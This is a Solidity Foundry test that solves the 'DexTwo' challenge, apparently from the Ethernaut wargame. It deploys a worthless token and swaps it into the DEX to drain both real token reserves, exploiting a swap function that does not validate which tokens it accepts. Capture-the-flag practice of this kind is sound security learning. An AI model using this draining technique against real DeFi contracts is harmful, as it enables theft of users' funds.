// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {DexTwo} from "src/levels/DexTwo.sol";
import {DexTwoFactory} from "src/levels/DexTwoFactory.sol";
import {SwappableTokenTwo} from "src/levels/DexTwo.sol";
import {UselessToken} from "src/hack/UselessToken.sol";

contract DexTwoTest is Test {
    DexTwo private dexTwo;
    DexTwoFactory private factory;
    address private attacker = makeAddr("attacker");
    address private deployer = makeAddr("deployer");
    SwappableTokenTwo private tokenOne;
    SwappableTokenTwo private tokenTwo;

    function setUp() external {
        vm.prank(deployer, deployer);
        factory = new DexTwoFactory();

        vm.prank(attacker, attacker);
        address dexTwoAddress = factory.createInstance(attacker);
        dexTwo = DexTwo(dexTwoAddress);

        tokenOne = SwappableTokenTwo(dexTwo.token1());
        tokenTwo = SwappableTokenTwo(dexTwo.token2());
    }

    function test_DexTwoHack() external {
        vm.startPrank(attacker, attacker);
        UselessToken uselessToken = new UselessToken(
            "UselessToken",
            "UTN",
            500
        );
        uselessToken.approve(address(dexTwo), 500);
        uselessToken.transfer(address(dexTwo), 100);

        dexTwo.swap(address(uselessToken), address(tokenOne), 100);

        // Calculate amount of UselessToken to swap to get Token2
        // The number of token2 to be returned = (amount of token1 to be swapped * token2 balance of the contract)/token1 balance of the contract.
        // 100 = (x * 100)/200
        // x = 200
        dexTwo.swap(address(uselessToken), address(tokenTwo), 200);

        uint tokenOneBalanceAfterHack = tokenOne.balanceOf(address(dexTwo));
        uint tokenTwoBalanceAfterHack = tokenTwo.balanceOf(address(dexTwo));
        assertTrue(
            tokenOneBalanceAfterHack == 0 && tokenTwoBalanceAfterHack == 0,
            "hack Failed!!!"
        );

        bool success = factory.validateInstance(
            payable(address(dexTwo)),
            attacker
        );
        assertTrue(success, "SUCCESS!!! Validate the instance.");

        vm.stopPrank();
    }
}
